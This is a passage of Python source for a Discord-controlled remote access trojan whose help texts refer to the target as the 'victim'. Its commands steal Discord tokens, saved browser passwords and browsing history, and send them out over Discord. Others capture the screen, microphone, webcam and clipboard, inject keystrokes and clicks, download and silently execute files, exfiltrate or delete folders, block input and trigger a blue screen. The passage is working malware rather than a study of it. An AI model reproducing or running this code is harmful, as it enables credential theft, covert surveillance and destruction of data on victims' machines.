    library_vdf_path = os.path.join(steam_path, "steamapps", "libraryfolders.vdf")
    if not os.path.exists(library_vdf_path):
        await ctx.send("Could not find `libraryfolders.vdf` in your Steam folder.")
        return

    try:
        with open(library_vdf_path, 'r', encoding='utf-8') as f:
            data = vdf.load(f)
    except Exception as e:
        await ctx.send(f"Failed to parse libraryfolders.vdf: {e}")
        return

    libraries = []
    libroot = data.get('libraryfolders', {})
    for key, val in libroot.items():
        if key.isdigit():
            path = (val.get('path') if isinstance(val, dict) else None) or ""
            if path and os.path.isdir(path):
                libraries.append(os.path.normpath(path))

    if steam_path not in libraries:
        libraries.append(os.path.normpath(steam_path))

    games = []
    gamesunf = []
    for lib in libraries:
        steamapps_path = os.path.join(lib, "steamapps")
        for manifest_path in glob.glob(os.path.join(steamapps_path, "appmanifest_*.acf")):
            try:
                with open(manifest_path, 'r', encoding='utf-8') as f:
                    manifest = vdf.load(f)
                app_state = manifest.get('AppState', {})
                name = app_state.get('name', 'Unknown')
                install_dir = app_state.get('installdir', 'Unknown')
                full_path = os.path.join(steamapps_path, "common", install_dir)
                games.append(f'> **{name}** ``{full_path}``')
                gamesunf.append(f'{name} - {full_path}')
            except Exception as e:
                print(f"Failed to parse {manifest_path}: {e}")

    output = "\n".join(games) or "No steam games found."
    outputunsf = "\n".join(gamesunf) or "No steam games found."
    await fm_send(ctx, output, outputunsf, "output.txt")

@bot.command(help="Gets discord tokens from Google Chrome, Opera (GX), Brave & Yandex")
async def getdiscord(ctx, max_force_profiles: int = 10):
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome_base = os.path.join(local, 'Google', 'Chrome', 'User Data')
    paths = {
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
    }

    def decrypt_token(encrypted_value, key):
        try:
            if encrypted_value.startswith(b'dQw4w9WgXcQ:'):
                encrypted_value = base64.b64decode(encrypted_value[15:])
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted.decode()
        except:
            return None

    embed = discord.Embed(title="Discord Tokens (Browser-Only)", color=discord.Color.blue())
    found_any = False

    def scan_leveldb(profile_path, aes_key):
        leveldb = os.path.join(profile_path, 'Local Storage', 'leveldb')
        tokens = set()

        if not os.path.exists(leveldb):
            return tokens

        for file_name in os.listdir(leveldb):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            try:
                with open(os.path.join(leveldb, file_name), errors='ignore') as f:
                    lines = f.readlines()
                for line in lines:
                    line = line.strip()
                    if aes_key and "dQw4w9WgXcQ:" in line:
                        for match in re.findall(r'dQw4w9WgXcQ:[^\"]+', line):
                            decrypted = decrypt_token(match.encode(), aes_key)
                            if decrypted:
                                tokens.add(decrypted)
                    for match in re.findall(r'mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line):
                        tokens.add(match)
            except:
                continue

        return tokens

    if os.path.exists(chrome_base):
        chrome_local_state = os.path.join(chrome_base, 'Local State')
        aes_key = get_master_key(chrome_local_state) if os.path.exists(chrome_local_state) else None
        chrome_tokens = set()

        # Always check Default
        default_path = os.path.join(chrome_base, "Default")
        if os.path.exists(default_path):
            chrome_tokens.update(scan_leveldb(default_path, aes_key))

        # Force check Profile 1 to max_force_profiles
        for i in range(1, max_force_profiles + 1):
            profile_path = os.path.join(chrome_base, f"Profile {i}")
            if os.path.exists(profile_path):
                chrome_tokens.update(scan_leveldb(profile_path, aes_key))

        # Continue checking Profile N+ until folder missing
        i = max_force_profiles + 1
        while True:
            profile_path = os.path.join(chrome_base, f"Profile {i}")
            if not os.path.exists(profile_path):
                break
            chrome_tokens.update(scan_leveldb(profile_path, aes_key))
            i += 1

        if chrome_tokens:
            found_any = True
            formatted = "\n".join(f"`{t}`" for t in chrome_tokens)
            embed.add_field(name="Google Chrome", value=formatted, inline=False)

    for platform, base_path in paths.items():
        try:
            local_state = os.path.join(os.path.dirname(base_path), 'Local State')
            aes_key = get_master_key(local_state) if os.path.exists(local_state) else None
            tokens = scan_leveldb(base_path, aes_key)
            if tokens:
                found_any = True
                formatted = "\n".join(f"`{t}`" for t in tokens)
                embed.add_field(name=platform, value=formatted, inline=False)
        except Exception as e:
            embed.add_field(name=platform, value=f"Error: `{str(e)}`", inline=False)

    if not found_any:
        embed.description = "No usable tokens found in browser paths."

    try:
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error sending message: {str(e)}")

def decrypt_password(ciphertext, key):
    try:
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode()
        else:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
    except:
        return "Failed to decrypt"

def dump_passwords(login_data_path, key):
    if not os.path.exists(login_data_path):
        return []
    temp_db = os.path.join(os.getenv("TEMP"), "temp_browser_login_data.db")
    shutil.copyfile(login_data_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    entries = cursor.fetchall()
    conn.close()
    return entries

@bot.command(help="Gets passwords from Google Chrome & Opera GX")
async def getpasswords(ctx, max_force_profiles: int = 10):
    files = []
    missing_browsers = []

    # Chrome
    chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
    chrome_local_state = os.path.join(chrome_base, "Local State")

    if os.path.exists(chrome_local_state):
        try:
            chrome_key = get_master_key(chrome_local_state)
            chrome_output = io.StringIO()
            chrome_output.write("Chrome has patched password stealing, so if the victim has the latest version, this will not work untill I figure it out (I highly doubt I will).\n\n")
            
            default_login = os.path.join(chrome_base, "Default", "Login Data")
            if os.path.exists(default_login):
                entries = dump_passwords(default_login, chrome_key)
                if entries:
                    chrome_output.write("===== Default =====\n\n")
                    for url, username, pw in entries:
                        chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")

            for i in range(1, max_force_profiles + 1):
                profile = f"Profile {i}"
                login_data = os.path.join(chrome_base, profile, "Login Data")
                if os.path.exists(login_data):
                    entries = dump_passwords(login_data, chrome_key)
                    if entries:
                        chrome_output.write(f"\n===== {profile} =====\n\n")
                        for url, username, pw in entries:
                            chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")

            i = max_force_profiles + 1
            while True:
                profile = f"Profile {i}"
                login_data = os.path.join(chrome_base, profile, "Login Data")
                if not os.path.exists(login_data):
                    break
                entries = dump_passwords(login_data, chrome_key)
                if entries:
                    chrome_output.write(f"\n===== {profile} =====\n\n")
                    for url, username, pw in entries:
                        chrome_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, chrome_key)}\n{'-'*40}\n")
                i += 1

            if chrome_output.getvalue():
                chrome_buffer = io.BytesIO(chrome_output.getvalue().encode('utf-8'))
                files.append(discord.File(fp=chrome_buffer, filename="Chrome_passwords.txt"))
            else:
                missing_browsers.append("Chrome")

        except Exception:
            missing_browsers.append("Chrome")
    else:
        missing_browsers.append("Chrome")

    # Opera GX
    opera_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
    opera_local_state = os.path.join(opera_path, "Local State")
    opera_login_data = os.path.join(opera_path, "Login Data")

    if os.path.exists(opera_local_state) and os.path.exists(opera_login_data):
        try:
            opera_key = get_master_key(opera_local_state)
            entries = dump_passwords(opera_login_data, opera_key)

            if entries:
                opera_output = io.StringIO()
                opera_output.write("===== Opera GX =====\n\n")
                for url, username, pw in entries:
                    opera_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, opera_key)}\n{'-'*40}\n")
                opera_buffer = io.BytesIO(opera_output.getvalue().encode('utf-8'))
                files.append(discord.File(fp=opera_buffer, filename="OperaGX_passwords.txt"))
            else:
                missing_browsers.append("Opera GX")

        except Exception:
            missing_browsers.append("Opera GX")
    else:
        missing_browsers.append("Opera GX")
        
    # Plain Opera
    opera_plain_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
    opera_plain_local_state = os.path.join(opera_plain_path, "Local State")
    opera_plain_login_data = os.path.join(opera_plain_path, "Login Data")

    if os.path.exists(opera_plain_local_state) and os.path.exists(opera_plain_login_data):
        try:
            opera_plain_key = get_master_key(opera_plain_local_state)
            entries = dump_passwords(opera_plain_login_data, opera_plain_key)

            if entries:
                opera_output = io.StringIO()
                opera_output.write("===== Opera =====\n\n")
                for url, username, pw in entries:
                    opera_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, opera_plain_key)}\n{'-'*40}\n")
                opera_buffer = io.BytesIO(opera_output.getvalue().encode('utf-8'))
                files.append(discord.File(fp=opera_buffer, filename="Opera_passwords.txt"))
            else:
                missing_browsers.append("Opera")

        except Exception:
            missing_browsers.append("Opera")
    else:
        missing_browsers.append("Opera")

    content = ""
    if missing_browsers and len(missing_browsers) < 2:
        content = f"Files not found for: {missing_browsers[0]}"
    elif missing_browsers:
        content = "Files not found for: " + ", ".join(missing_browsers)

    if not files and not content:
        content = "No password files were found for either browser."

    try:
        await ctx.send(content=content, files=files if files else None)
    except Exception as e:
        await ctx.send(f"Error sending message: {e}")
        
@bot.command(help="Gets browser history from Google Chrome & Opera GX")
async def gethistory(ctx, max_force_profiles: int = 10):
    files = []
    missing_browsers = []

    async def extract_chrome_history():
        base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
        if not os.path.exists(base):
            return None, "Chrome"

        output = io.StringIO()
        epochstart_tts = datetime.datetime(1601, 1, 1)
        min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
        min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)

        async def extract(profile):
            try:
                profile_path = os.path.join(base, profile, "History")
                if not os.path.exists(profile_path):
                    return False
                temp_db = os.path.join(os.getenv("TEMP"), f"{profile}_history_temp.db")
                shutil.copy2(profile_path, temp_db)
            
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
                rows = cursor.fetchall()
                if rows:
                    output.write(f"===== {profile} =====\n\n")
                    for url, ts in rows:
                        visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                        output.write(f"URL: {url}\n")
                        output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                        output.write("----------------------------------------\n")
                    output.write("\n")
                conn.close()
            except Exception as e:
                await ctx.send("Error extracting Chrome history: " + str(e))
            if os.path.exists(temp_db):
                os.remove(temp_db)
            return True

        found = await extract("Default")

        for i in range(1, max_force_profiles + 1):
            found |= await extract(f"Profile {i}")

        i = max_force_profiles + 1
        while True:
            if not await extract(f"Profile {i}"):
                break
            i += 1
        return output.getvalue().encode("utf-8") if found else None, None

    async def extract_operagx_history():
        base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
        history_path = os.path.join(base, "History")
        if not os.path.exists(history_path):
            return None, "Opera GX"
        try:
            output = io.StringIO()
            epochstart_tts = datetime.datetime(1601, 1, 1)
            min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
            min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)

            temp_db = os.path.join(os.getenv("TEMP"), "opera_history_temp.db")
            shutil.copy2(history_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
            rows = cursor.fetchall()
            if rows:
                output.write("===== Opera GX =====\n\n")
                for url, ts in rows:
                    visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                    output.write(f"URL: {url}\n")
                    output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                    output.write("----------------------------------------\n")
                output.write("\n")
            conn.close()
        except Exception as e:
            await ctx.send("Error extracting Opera GX history: " + str(e))
        if os.path.exists(temp_db):
            os.remove(temp_db)
        return output.getvalue().encode("utf-8"), None
    
    async def extract_opera_history():
        base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default")
        history_path = os.path.join(base, "History")
        if not os.path.exists(history_path):
            return None, "Opera"
        try:
            output = io.StringIO()
            epochstart_tts = datetime.datetime(1601, 1, 1)
            min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
            min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)

            temp_db = os.path.join(os.getenv("TEMP"), "opera_plain_history_temp.db")
            shutil.copy2(history_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
            rows = cursor.fetchall()
            if rows:
                output.write("===== Opera =====\n\n")
                for url, ts in rows:
                    visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                    output.write(f"URL: {url}\n")
                    output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                    output.write("----------------------------------------\n")
                output.write("\n")
            conn.close()
        except Exception as e:
            await ctx.send("Error extracting Opera history: " + str(e))
        if os.path.exists(temp_db):
            os.remove(temp_db)
        return output.getvalue().encode("utf-8"), None

    chrome_data, chrome_err = await extract_chrome_history()
    opera_data, opera_err = await extract_operagx_history()
    opera_plain_data, opera_plain_err = await extract_opera_history()

    if chrome_data:
        chrome_buffer = io.BytesIO(chrome_data)
        files.append(discord.File(fp=chrome_buffer, filename="Chrome_history.txt"))
    elif chrome_err:
        missing_browsers.append(chrome_err)

    if opera_data:
        opera_buffer = io.BytesIO(opera_data)
        files.append(discord.File(fp=opera_buffer, filename="OperaGX_history.txt"))
    elif opera_err:
        missing_browsers.append(opera_err)

    if opera_plain_data:
        opera_plain_buffer = io.BytesIO(opera_plain_data)
        files.append(discord.File(fp=opera_plain_buffer, filename="Opera_history.txt"))
    elif opera_plain_err:
        missing_browsers.append(opera_plain_err)

    content = ""
    if missing_browsers and len(missing_browsers) == 1:
        content = f"Files not found for: {missing_browsers[0]}"
    elif missing_browsers:
        content = "Files not found for: " + ", ".join(missing_browsers)

    if not files and not content:
        content = "No history files were found for any browser."

    try:
        await ctx.send(content=content, files=files if files else None)
    except Exception as e:
        await ctx.send(f"Error sending message: {e}")


@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display, If you dont like it, you can suck it.")
async def setpos(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await ctx.send("Cursor position set successfully.")
    except Exception as e:
        await ctx.send(f"Error setting cursor position: {str(e)}")

@bot.command(help="Simulate left mouse click on victim's device.")
async def lclick(ctx):
    try:
        pyautogui.click(button='left')
        await ctx.send("Left click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing left click: {str(e)}")

@bot.command(help="Simulate middle mouse click on victim's device.")
async def mclick(ctx):
    try:
        pyautogui.click(button='middle')
        await ctx.send("Middle click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing middle click: {str(e)}")

@bot.command(help="Simulate right mouse click on victim's device.")
async def rclick(ctx):
    try:
        pyautogui.click(button='right')
        await ctx.send("Right click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing right click: {str(e)}")

@bot.command(help="Triggers a pyautogui hotkey on victims device seperated by spaces. Available keys: https://bit.ly/3ya6vKg.")
async def hotkey(ctx, *, keys=None):
    if not keys:
        await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
        return

    try:
        pyautogui.hotkey(*keys.split())
        await ctx.send(f"Pressed hotkey: `{keys}`")
    except Exception as e:
        await ctx.send(f"Error: `{e}`")

@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, down, up, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg")
async def key(ctx, func: str = "", value: str = ""):
    if not func:
        await ctx.send("Function not provided. Available functions: press, down, up, hotkey.")
        return

    func = func.lower()
    
    if func not in ["press", "down", "up", "hotkey"]:
        await ctx.send("Invalid function. Available functions: press, down, up, hotkey.")
        return

    if not value or value == "":
        await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
        return
    
    try:
        if func == "press":
            pyautogui.press(value)
        elif func == "down":
            pyautogui.keyDown(value)
        elif func == "up":
            pyautogui.keyUp(value)
        elif func == "hotkey":
            keys = value.split("+")
            pyautogui.hotkey(*keys)
        
        await ctx.send("Command executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")


@bot.command(help="Get victims clipboard.")
async def get_clipboard(ctx):
    try:
        await ctx.send(f"Current clipboard: ```{pyperclip.paste()}```")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Copy given text to victims clipboard.")
async def set_clipboard(ctx, *, text: str):
    try:
        pyperclip.copy(text)
        await ctx.send(f"Copied to clipboard")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")   

@bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).")
async def ss(ctx, display_index: int = 0):
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            if display_index < 0 or display_index >= len(monitors):
                available = ", ".join(str(i) for i in range(len(monitors)))
                await ctx.send(f"Invalid display index provided. Available displays: {available}")
                return

            monitor = monitors[display_index]
            sct_img = sct.grab(monitor)
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            cursor = pyautogui.position()
            relative_cursor = (cursor[0] - monitor["left"], cursor[1] - monitor["top"])
            draw = ImageDraw.Draw(img)
            x, y = relative_cursor
            draw.ellipse((x-5, y-5, x+5, y+5), fill=(255, 0, 0))
            
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            buffer.seek(0)
            await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(fp=buffer, filename="screenshot.png"))
    except Exception as e:
        await ctx.send(f"Error executing screenshot command: {str(e)}")
                
_tts_thread = None
_tts_error = None
_tts_stop = None
_MAX_CHUNK = 4096

def tts_worker(text, stop_evt: Event):
    global _tts_error
    pythoncom.CoInitialize()
    try:
        v = win32com.client.Dispatch("SAPI.SpVoice")
        cur = ""
        for t in re.split(r"([\.!?]\s+|\n+)", text):
            if not t:
                continue
            if len(cur) + len(t) > _MAX_CHUNK and cur:
                s = cur.strip()
                i = 0
                while i < len(s):
                    seg = s[i:i+_MAX_CHUNK].strip()
                    if seg:
                        if stop_evt.is_set(): break
                        v.Speak(seg, 1)
                        while True:
                            if stop_evt.is_set():
                                try: v.Speak("", 2)
                                except Exception: pass
                                break
                            if v.WaitUntilDone(150): break
                    i += _MAX_CHUNK
                if stop_evt.is_set(): break
                cur = t
            else:
                cur += t

        if not stop_evt.is_set():
            s = cur.strip()
            i = 0
            while i < len(s):
                seg = s[i:i+_MAX_CHUNK].strip()
                if seg:
                    if stop_evt.is_set(): break
                    v.Speak(seg, 1)
                    while True:
                        if stop_evt.is_set():
                            try: v.Speak("", 2)
                            except Exception: pass
                            break
                        if v.WaitUntilDone(150): break
                i += _MAX_CHUNK

        try: v.Speak("", 2)
        except Exception: pass
    except Exception as e:
        _tts_error = e
    finally:
        pythoncom.CoUninitialize()

def start_tts(text):
    global _tts_thread, _tts_stop, _tts_error
    _tts_error = None
    if _tts_thread and _tts_thread.is_alive():
        if _tts_stop: _tts_stop.set()
    text = re.sub(r"\s+", " ", text or "").strip()
    if not text: return False
    _stop = Event()
    _tts_stop = _stop
    _tts_thread = Thread(target=tts_worker, args=(text, _stop), daemon=True)
    _tts_thread.start()
    if _tts_error: raise _tts_error
    return True

@bot.command(name="tts", help="Run TTS on victim's system")
async def tts(ctx, *, text: str = None):
    if not text or not text.strip():
        await ctx.send("You must provide text for TTS")
        return
    try:
        ok = start_tts(text)
        await ctx.send(f"TTS started. Use {bot.command_prefix}stoptts to stop it." if ok else "You must provide text for TTS.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="ttsurl", help="Run TTS on victim's system from a URL (should be raw text)")
async def ttsurl(ctx, url: str = None):
    if not url or not url.strip():
        await ctx.send("You must provide a url for TTS.")
        return
    try:
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        r.raise_for_status()
        txt = r.text or ""
        if "html" in (r.headers.get("Content-Type","").lower()) or re.search(r"<\s*html", txt[:1000], re.I):
            txt = re.sub(r"(?is)<(script|style)\b[^>]*>.*?</\1>", " ", txt)
            txt = re.sub(r"(?is)<[^>]+>", " ", txt)
        ok = start_tts(txt)
        await ctx.send(f"TTS started. Use {bot.command_prefix}stoptts to stop it." if ok else "No readable text at that URL.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="stoptts", help="Stops TTS")
async def stoptts(ctx):
    global _tts_thread, _tts_stop
    if _tts_thread and _tts_thread.is_alive():
        if _tts_stop: _tts_stop.set()
        await ctx.send("TTS process stopped.")
    else:
        await ctx.send("No TTS process running.")

@bot.command(help="Records audio from the victim's microphone for 10 seconds.")
async def listen(ctx):
    loop = asyncio.get_event_loop()
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 10

    def recording_thread():
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()

        buffer = io.BytesIO()
        wf = wave.open(buffer, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        buffer.seek(0)
        loop.call_soon_threadsafe(asyncio.create_task, send_response(ctx, buffer))

    async def send_response(ctx, buf):
        await ctx.send("Command Executed!", file=discord.File(fp=buf, filename="output.wav"))

    thread = Thread(target=recording_thread)
    thread.start()

@bot.command(help="Types the given text on the victim's system.")
async def write(ctx, *, text: str):
    try:
        pyautogui.write(text)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Upload a file to a specific path on victim's system")
async def upload(ctx, folder: str = None):
    if not folder:
        await ctx.send("Error: No folder path provided. Please specify a folder to upload the file to.")
        return
    if not os.path.exists(folder):
        os.makedirs(folder)
    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(folder, attachment.filename)
        await attachment.save(file_path)
        await ctx.send(f"File `{attachment.filename}` has been saved to '{folder}'.")
    else:
        await ctx.send("Error: No file attached to the message.")

@bot.command(help="Lists contents of a folder on the system, format $ls {folder (D:/folder)}")
async def ls(ctx, path: str = None):
    try:
        if not path:
            await ctx.send("Error: No path provided. Please specify a directory path to list.")
            return

        if not os.path.exists(path):
            await ctx.send(f"Error: The path '{path}' does not exist.")
            return
        if not os.path.isdir(path):
            await ctx.send(f"Error: The path '{path}' is not a directory.")
            return

        items = os.listdir(path)
        parent_dir = os.path.abspath(os.path.join(path, os.pardir))
        dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
        files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
        response = f"Parent Directory: {parent_dir}\n\n"

        if dirs or files:
            for directory in dirs:
                dir_full_path = os.path.join(path, directory)
                response += f"[DIR]  {dir_full_path}\n"
            for file in files:
                file_full_path = os.path.join(path, file)
                response += f"[FILE] {file_full_path}\n"
        else:
            response += "This directory is empty.\n"

        buffer = io.BytesIO(response.encode('utf-8'))
        await ctx.send(file=discord.File(fp=buffer, filename="directory_listing.txt"))
    except Exception as e:
        await ctx.send(f"Error: Could not list the directory contents. {str(e)}")

@bot.command(help="Downloads attached file and runs it on the victim's device.")
async def downloadandrun(ctx):
    if not ctx.message.attachments:
        await ctx.send("Error: No file attached. Please attach a file to download and run.")
        return

    attachment = ctx.message.attachments[0]

    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
    if not os.path.exists(downloads_folder):
        os.makedirs(downloads_folder, exist_ok=True)

    file_path = os.path.join(downloads_folder, attachment.filename)
    try:
        file_bytes = await attachment.read()
        with open(file_path, "wb") as f:
            f.write(file_bytes)
    except Exception as e:
        await ctx.send(f"Error downloading file: {e}")
        return

    try:
        process = subprocess.Popen(f'cmd /c start "" /wait "{file_path}" && del /f /q "{file_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await asyncio.to_thread(process.wait)
        await ctx.send("File executed and deleted after finishing.")
        
    except Exception as e:
        await ctx.send(f"Error executing file: {e}")
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
async def run(ctx, file_path: str = None):
    if not file_path:
        await ctx.send("Error: No file path provided. Please specify the file path to run.")
        return
    if not os.path.exists(file_path):
        await ctx.send(f"Error: The file '{file_path}' does not exist.")
        return
    try:
        subprocess.Popen(file_path, shell=True)
        await ctx.send(f"File '{file_path}' has been executed.")
    except Exception as e:
        await ctx.send(f"Error: Could not execute the file. {str(e)}")    

@bot.command(help="Compresses and downloads a file or folder from victim's system, format $download {file_or_folder_path (D:/file_or_folder)} (attached file is downloaded)")
async def download(ctx, file_path: str = None):
    try:
        if not file_path:
            await ctx.send("Error: No file path provided. Please specify the file or folder path to download.")
            return
        if not os.path.exists(file_path):
            await ctx.send(f"Error: The path '{file_path}' does not exist.")
            return
        
        tar_filename = os.path.basename(file_path) + '.tar.gz'
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            tar.add(file_path, arcname=os.path.basename(file_path))
        buffer.seek(0)
        await ctx.send(file=discord.File(fp=buffer, filename=tar_filename))
    except Exception as e:
        await ctx.send(f"Error: Could not compress and send the file or folder. {str(e)}")
    
@bot.command(help="Deletes a folder or file from the victim's system, format $delete {file (D:/file.png)}")
async def delete(ctx, path: str = None):
    if not path:
        await ctx.send("Error: No path provided. Please specify a file or folder path to delete.")
        return
    if os.path.isfile(path):
        os.remove(path)
        await ctx.send(f"File '{path}' has been deleted.")
    elif os.path.isdir(path):
        shutil.rmtree(path)
        await ctx.send(f"Folder '{path}' and all its contents have been deleted.")
    else:
        await ctx.send(f"The path '{path}' does not exist.")
        
@bot.command(help="Moves a file from one location to another on victim's system, format $move {file (D:/file.png)} {folder (D:/destination/)}")
async def move(ctx, source: str = None, destination: str = None):
    if not source or not destination:
        await ctx.send("Error: Please provide both source and destination paths.")
        return
    if not os.path.exists(source):
        await ctx.send(f"Error: The source path '{source}' does not exist.")
        return
    destination_dir = os.path.dirname(destination)
    if not os.path.exists(destination_dir):
        await ctx.send(f"Error: The destination directory '{destination_dir}' does not exist.")
        return
    try:
        shutil.move(source, destination)
        await ctx.send(f"'{source}' has been moved to '{destination}'.")
    except Exception as e:
        await ctx.send(f"Error: Could not move '{source}' to '{destination}'. {str(e)}")

@bot.command(help="Freezes the cursor on the victim's system.")
async def freezecursor(ctx):
    try:
        result = ctypes.windll.user32.BlockInput(True)
        if result == 0:
            await ctx.send("Failed to freeze cursor. Victim is not running with elevated privileges.")
        else:
            await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Unfreezes the cursor on the victim's system.")
async def unfreezecursor(ctx):
    try:
        ctypes.windll.user32.BlockInput(False)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Attempts to trigger a blue screen on the victim's system.")
async def bluescreen(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Takes a picture on the victim's webcam.")
async def webcampic(ctx, cam: int = 0):
    try:
        cap = cv2.VideoCapture(cam)
        if not cap.isOpened():
            raise Exception("Could not open webcam")
        
        ret, frame = cap.read()
        cap.release()
        if not ret:
            raise Exception("Failed to grab frame from webcam")
        
        buffer = io.BytesIO()
        ret, im_encoded = cv2.imencode(".png", frame)
        if not ret:
            raise Exception("Failed to encode image")
        buffer.write(im_encoded.tobytes())
        buffer.seek(0)
        await ctx.send(f"Captured from camera {cam}!", file=discord.File(fp=buffer, filename="webcam.png"))
    except Exception as e:
        await ctx.send(f"Error executing webcam capture command: {str(e)}")

@bot.command(help="Lists all running tasks on the victim's system.")
async def tasks(ctx):
    import psutil, io, discord
    try:
        processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
        processes.sort(key=lambda p: (p['name'] or '').lower())
        text = ""
        for proc in processes:
            if proc['name'] and proc['name'] != "":
                text += f"{proc['name']} - {proc['pid']}\n"
        buffer = io.BytesIO(text.encode('utf-8'))
        await ctx.send("List of running tasks:", file=discord.File(fp=buffer, filename="tasks.txt"))
    except Exception as e:
        await ctx.send(f"Error: Could not list tasks. {str(e)}")

@bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.")
